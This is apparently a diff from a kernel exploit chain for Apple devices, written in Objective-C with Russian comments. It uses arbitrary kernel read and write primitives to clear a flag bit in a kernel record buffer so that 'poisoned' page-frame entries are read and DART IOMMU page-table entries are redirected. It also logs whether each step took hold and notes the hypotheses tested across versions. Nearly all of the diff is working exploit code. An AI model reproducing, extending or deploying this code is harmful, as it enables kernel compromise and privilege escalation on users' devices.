@@ -6333,16 +6333,18 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
                 hitAddr[nDep] = buf247 + 0x30 + (uint64_t)i * 8; hitOld[nDep] = e; hitForm[nDep] = 5; nDep++;
             }
-            // 1.9.248: форс records-built — в 247-м flags=0xc0 (bit1=0): сериализатор
-            // при fresh op ПЕРЕСТРАИВАЛ записи из источника и затирал яд (H1-гипотеза
-            // ctl-changed=0 ×3). Ставим bit1 — cached-путь обязан доверять буферу.
-            if (nDep && !(bfl247 & 0x02)) {
-                uint8_t fnew = bfl247 | 0x02;
+            // 1.9.250 (р.62): bit1 SET = STALE-ветка — op-4 отдаёт старые сегменты
+            // buffer+0x10, entries НЕ читаются (ошибка 248-й: яд нетронут, PTE мимо).
+            // Нужен bit1 CLEAR: сериализатор читает entries напрямую (0x86eae2c:
+            // ldr w14 = pfn32 → PA = pfn<<14|pageOff → mapper → DART PTE).
+            // Снимаем бит если стоит; оригинал кворда — в финальный restore.
+            if (nDep && (bfl247 & 0x02)) {
+                uint8_t fnew = bfl247 & ~0x02;
                 usleep(1500);
                 flOld247 = early_kread64(buf247 + 0x28);
                 early_kwrite64(buf247 + 0x28, (flOld247 & ~(0xffULL << 40)) | ((uint64_t)fnew << 40));   // байт +0x2d = биты 40-47
                 uint8_t fck = 0; kreadbuf(buf247 + 0x2d, &fck, 1);
-                kpNote(r, [NSString stringWithFormat:@"  [CHAIN] форс records-built: flags %#x → %#x — %@", bfl247, fck, (fck & 0x02) ? @"ВСТАЛО" : @"МИМО"]);
+                kpNote(r, [NSString stringWithFormat:@"  [CHAIN] гарант serialize (bit1 clear): flags %#x → %#x — %@", bfl247, fck, !(fck & 0x02) ? @"ВСТАЛО" : @"МИМО"]);
             }
         }
     }
@@ -7549,14 +7551,16 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         // 1.9.248: дамп record buffer ПОСЛЕ submit — решает H1/H2 из 247-й:
         // entry0 вернулся к оригиналу = rebuild перезаписал яд (H1, источник
         // глубже — wire-layer); entry0 == ctlPFN = mapper игнорирует буфер (H2).
+        // 1.9.250 (р.62): bit1 SET = stale-ветка (entries не читаются), bit1
+        // CLEAR = сериализатор читает entries. Откат = пересборка из wire list.
         if (buf247) {
             uint8_t f2 = 0; kreadbuf(buf247 + 0x2d, &f2, 1);
             uint64_t e0 = early_kread64(buf247 + 0x30);
             uint64_t e1 = early_kread64(buf247 + 0x38);
             kpNote(r, [NSString stringWithFormat:@"      buffer пост-submit: flags=%#x entry0=%#018llx entry1=%#018llx — %@",
                       f2, (unsigned long long)e0, (unsigned long long)e1,
-                      (uint32_t)e0 == ctlPFN ? @"яд НА МЕСТЕ (H2: mapper мимо буфера)" :
-                      (uint32_t)e0 == pfn32 ? @"ОТКАТ в оригинал (H1: rebuild перезаписал — источник глубже)" : @"ТРЕТЬЕ ЗНАЧЕНИЕ"]);
+                      (uint32_t)e0 == ctlPFN ? @"яд НА МЕСТЕ (entries не прочитаны: stale-ветка/sanity — копаем [desc+0x88] wire list)" :
+                      (uint32_t)e0 == pfn32 ? @"ОТКАТ в оригинал (пересборка из wire list [desc+0x88] — следующая цель)" : @"ТРЕТЬЕ ЗНАЧЕНИЕ"]);
         }
         if (!changed) {
             for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], origQs[j]);
